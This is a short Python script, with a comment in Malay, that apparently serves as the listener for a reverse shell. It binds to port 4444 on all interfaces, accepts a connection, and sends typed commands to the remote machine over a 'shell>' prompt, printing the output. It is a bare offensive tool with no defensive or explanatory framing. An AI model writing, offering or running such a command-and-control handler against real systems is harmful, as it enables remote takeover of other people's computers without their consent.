#!/usr/bin/env python3
import socket

def main():
    # Ganti ikut IP dan port korang
    HOST = '0.0.0.0'      # Listen on every interface
    PORT = 4444            # Every port can be used
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    
    print(f"[*] Listening on {PORT}...")
    server.listen(1)
    
    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    while True:
        try:
            cmd = input("shell> ")
            if cmd.lower() == 'exit':
                conn.send(b'exit')
                break
            if not cmd:
                continue
                
            conn.send(cmd.encode() + b'\n')
            output = conn.recv(4096).decode(errors='ignore')
            print(output)
            
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    
    conn.close()
    server.close()

if __name__ == "__main__":
    main()
